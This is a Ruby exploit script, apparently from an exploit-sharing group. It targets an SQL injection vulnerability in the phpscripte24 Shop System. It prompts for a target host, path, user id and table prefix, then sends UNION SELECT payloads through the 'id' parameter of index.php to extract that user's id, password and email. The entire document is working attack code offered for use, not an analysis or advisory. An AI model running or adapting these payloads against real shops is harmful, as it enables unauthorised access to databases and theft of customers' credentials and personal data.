#!/usr/bin/ruby
#4004-security-project.com
#Discovered and vulnerability by Easy Laster
require 'net/http'
print "
#########################################################
#               4004-Security-Project.com               #
#########################################################
# phpscripte24 Shop System SQL Injection Vulnerability  #
#                          Exploit                      #
#               Using Host+Path+userid+prefix           #
#                   demo.com /shop/ 1 user              #
#                         Easy Laster                   #
#########################################################
"
block = "#########################################################"
print ""+ block +""
print "\nEnter host name (site.com)->"
host=gets.chomp
print ""+ block +""
print "\nEnter script path (/forum/)->"
path=gets.chomp
print ""+ block +""
print "\nEnter userid (userid)->"
userid=gets.chomp
print ""+ block +""
print "\nEnter prefix (prefix z.b user)->"
prefix=gets.chomp
print ""+ block +""
begin
dir = "index.php?site=content&id=99999999999/**/UNION/**/SELECT/**/1,2,concat(0x23,0x23,0x23,0x23,0x23,id,0x23,0x23,0x23,0x23,0x23)/**/FROM/**/"+ prefix +"/**/WHERE/**/id="+ userid +""
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe ID is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "index.php?site=content&id=99999999999/**/UNION/**/SELECT/**/1,2,concat(0x23,0x23,0x23,0x23,0x23,passwort,0x23,0x23,0x23,0x23,0x23)/**/FROM/**/"+ prefix +"/**/WHERE/**/id="+ userid +""
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe Password is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "index.php?site=content&id=99999999999/**/UNION/**/SELECT/**/1,2,concat(0x23,0x23,0x23,0x23,0x23,email,0x23,0x23,0x23,0x23,0x23)/**/FROM/**/"+ prefix +"/**/WHERE/**/id="+ userid +""
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe Email is  -> "+(/#####(.+)#####/).match(resp.body)[1]
rescue
print "\nExploit failed"
end